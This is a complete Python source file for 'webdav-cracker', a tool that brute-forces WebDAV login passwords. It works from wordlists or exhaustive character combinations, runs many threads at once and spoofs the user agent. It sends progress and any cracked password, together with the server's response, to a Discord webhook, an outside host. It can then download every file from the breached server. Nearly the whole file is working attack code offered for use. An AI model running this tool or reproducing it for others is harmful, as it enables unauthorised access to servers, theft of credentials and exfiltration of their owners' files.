#!/usr/bin/python3


##################################################################
#                                                                #
#                         webdav-cracker                         #
#                                                                #
#                Copyright (C) 2022 X Gamer Guide                #
#         https://github.com/X-Gamer-Guide/webdav-cracker        #
#                                                                #
#               don't learn to hack, hack to learn               #
#                                                                #
##################################################################


import argparse
import base64
import itertools
import json
import os
import queue
import string
import threading
import time
import urllib.parse
from typing import Iterable, Tuple

import cbor
import requests
import validators
from bs4 import BeautifulSoup


# to validate args


def dir_path(path) -> str:
    real = os.path.realpath(path)
    if os.path.isdir(real):
        return real
    else:
        raise NotADirectoryError(real)


def url(url) -> str:
    if not validators.url(url):
        raise Exception(f"Not a valid URL: {url}")
    return url


def b64(b64) -> str:
    return base64.b64decode(b64).decode()


# get command line args


parser = argparse.ArgumentParser(
    "webdav cracker",
    description="A tool to get access to a WEBDAV server",
    epilog="Copyright (C) 2022 X Gamer Guide"
)

parser.add_argument(
    "--url",
    metavar="WEBDAV URL",
    required=True,
    type=url,
    help="The WEBDAV URL of the target"
)

parser.add_argument(
    "--username",
    metavar="USERNAME",
    required=True,
    type=str,
    help="Username to attack",
    default="admin"
)

parser.add_argument(
    "--threads",
    metavar="COUNT",
    type=int,
    help="The number of threads used",
    default=1
)

parser.add_argument(
    "--passwords",
    metavar="TEXT FILE",
    type=argparse.FileType("r"),
    help="A file with passwords separated by \\n. After the file has been tried, the normal brute force mode turns on"
)

parser.add_argument(
    "--json_passwords",
    metavar="JSON FILE",
    type=argparse.FileType("r"),
    help="A JSON file with passwords. After the file has been tried, the normal brute force mode turns on"
)

parser.add_argument(
    "--cbor_passwords",
    metavar="CBOR FILE",
    type=argparse.FileType("rb"),
    help="A CBOR file with passwords. After the file has been tried, the normal brute force mode turns on"
)

parser.add_argument(
    "--webhook",
    metavar="DISCORD WEBHOOK",
    type=url,
    help="A Discord webhook to which information is transmitted"
)

parser.add_argument(
    "--download",
    metavar="DOWNLOAD PATH",
    type=dir_path,
    help="After brute forcing the password, all files are downloaded to the specified folder"
)

parser.add_argument(
    "--b64_start",
    metavar="START CHARACTERS",
    type=b64,
    help="The last characters that were seen in the terminal when it was last run (base64 encoded). At this point the program continues",
    default=""
)

parser.add_argument(
    "--b64_characters",
    metavar="BASE64 ENCODED CHARACTERS",
    type=b64,
    help="The characters used to attack (base64 encoded)",
    default=base64.b64encode((
        string.ascii_letters + string.digits + string.punctuation
    ).encode()).decode()
)

parser.add_argument(
    "--user_agent",
    metavar="USER AGENT",
    type=str,
    help="User agent for the WEBDAV requests",
    default="Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0"
)


args = parser.parse_args()


def get_dir(path: str) -> str:
    "Checks if the path is allowed"

    real = os.path.realpath(os.path.join(args.download, path))
    if os.path.commonprefix((
        real,
        args.download
    )) == args.download:
        return real
    raise Exception(f"Forbidden path: {real}")


def download_dir(path: str, password: str) -> None:
    "Download a WEBDAV folder"

    # download folder
    r = dav.get(
        urllib.parse.urljoin(f"{args.url}/", path),
        auth=(
            args.username,
            password
        )
    )
    r.raise_for_status()

    # parse 'a' tags from html
    soup = BeautifulSoup(r.text, "html.parser")
    for a in soup.find_all("a"):
        href = a.get("href")

        # ignore invalid urls
        if href.startswith("?") or href.startswith("/"):
            continue

        # download subfolder
        if href.endswith("/"):
            os.mkdir(get_dir(f"{path}{href}"))
            download_dir(f"{path}{href}", password)
            continue

        # download file
        r = dav.get(
            urllib.parse.urljoin(f"{args.url}/", path, href),
            auth=(
                args.username,
                password
            ),
            stream=True
        )
        r.raise_for_status()
        with open(get_dir(f"{path}{href}"), "wb") as f:
            for chunk in r.iter_content(1048576):
                f.write(chunk)


class WebHook:
    def __init__(self):
        self.session = requests.session()
        self.tasks = queue.Queue()

    def run(self) -> None:
        while True:
            data = self.tasks.get()
            while True:
                r = self.session.post(
                    args.webhook,
                    json=data
                )
                if r.status_code == 429:
                    time.sleep(r.json()['retry_after'] / 1000)
                    continue
                r.raise_for_status()
                break
            self.tasks.task_done()

    def send(self, data: dict) -> None:
        self.tasks.put(data)


class BruteForce:
    def __init__(self):
        self.started = False
        self.exit = None

    def log(self, message) -> None:
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}")
        if args.webhook is not None:
            webhook.send({
                "content": f"[`{time.strftime('%Y-%m-%d %H:%M:%S')}`] **{message}**"
            })

    def run(self) -> Tuple[requests.Response, str]:

        # brute force password file
        if args.passwords is not None:
            passwords = []
            for index, password in enumerate(args.passwords):
                while True:
                    if self.exit is not None:
                        return self.exit
                    if threading.active_count() < args.threads + 2:
                        passwords.append(password.strip())
                        if len(passwords) > 100:
                            self.log(f"password list {index}")
                            threading.Thread(target=self.check_passwords, daemon=True, args=(passwords,)).start()
                            passwords = []
                        break
                    time.sleep(0.1)
            self.log("password list end")
            self.check_passwords(passwords)

        # brute force JSON password file
        if args.json_passwords is not None:
            passwords = []
            for index, password in enumerate(json.load(args.json_passwords)):
                while True:
                    if self.exit is not None:
                        return self.exit
                    if threading.active_count() < args.threads + 2:
                        passwords.append(password)
                        if len(passwords) > 100:
                            self.log(f"JSON password list {index}")
                            threading.Thread(target=self.check_passwords, daemon=True, args=(passwords,)).start()
                            passwords = []
                        break
                    time.sleep(0.1)
            self.log("JSON password list end")
            self.check_passwords(passwords)

        # brute force CBOR password file
        if args.cbor_passwords is not None:
            passwords = []
            for index, password in enumerate(cbor.load(args.cbor_passwords)):
                while True:
                    if self.exit is not None:
                        return self.exit
                    if threading.active_count() < args.threads + 2:
                        passwords.append(password)
                        if len(passwords) > 100:
                            self.log(f"CBOR password list {index}")
                            threading.Thread(target=self.check_passwords, daemon=True, args=(passwords,)).start()
                            passwords = []
                        break
                    time.sleep(0.1)
            self.log("CBOR password list end")
            self.check_passwords(passwords)

        # standard berute force
        i = len(args.b64_start)
        while True:
            i += 1
            for j in map("".join, itertools.product(args.b64_characters, repeat=i-1)):
                while True:
                    if self.exit is not None:
                        return self.exit
                    if not self.started:
                        if args.b64_start != j:
                            break
                        self.started = True
                    if threading.active_count() < args.threads + 2:
                        self.log(f"{j} ..")
                        threading.Thread(target=self.brute_force, daemon=True, args=(j,)).start()
                        break
                    time.sleep(0.1)

    def check(self, password: str) -> None:
        # check for rights
        r = dav.request(
            "PROPFIND",
            args.url,
            headers={
                "Depth": "1"
            },
            auth=(
                args.username,
                password
            )
        )
        # evaluate the response of the server
        if r.status_code != 401:
            self.exit = r, password

    def check_passwords(self, passwords: Iterable[str]) -> None:
        for password in passwords:
            self.check(password)

    def brute_force(self, start: str) -> None:
        for i in range(2):
            for j in map("".join, itertools.product(args.b64_characters, repeat=i+1)):
                self.check(f"{start}{j}")


# create WEBDAV session
dav = requests.session()
dav.headers = {
    "User-Agent": args.user_agent
}

# send discord webhooks when required
webhook = WebHook()
threading.Thread(target=webhook.run, daemon=True).start()

# start brute force
brute_force = BruteForce()
response, password = brute_force.run()


# display response
print("-" * 80)
print(f"response header: {response.headers}")
print("-" * 80)
print(response.text)
print("-" * 80)
print(f"status: {response.status_code}")
print("-" * 80)
print(f"USER: {args.username}")
print(f"PASSWORD: {password}")


# send response to discord webhook
if args.webhook is not None:
    # generate description
    if len(response.text) < 4000:
        description = f"```html\n{response.text}\n```"
    else:
        description = f"```html\n{response.text[:4000]}\n```... ({4000 - len(response.text)})"
    # generate fields
    fields = []
    for header in response.headers:
        if len(response.headers[header]) < 1000:
            value = f"`{response.headers[header]}`"
        else:
            value = f"`{response.headers[header][1000:]}` ... ({1000 - len(response.headers[header])})"
        fields.append({
            "name": header,
            "value": value
        })
    # send
    webhook.send({
        "embeds": [
            {
                "title": password,
                "description": description,
                "color": 0x8E04B9,
                "fields": fields,
                "author": {
                    "name": f"Password found for {args.username}"
                },
                "footer": {
                    "text": f"status: {response.status_code}"
                }
            }
        ]
    })


# download all files
if args.download is not None:
    try:
        download_dir("", password)
    except requests.exceptions.HTTPError as ex:
        print(repr(ex))


# wait for unsent webhooks
webhook.tasks.join()
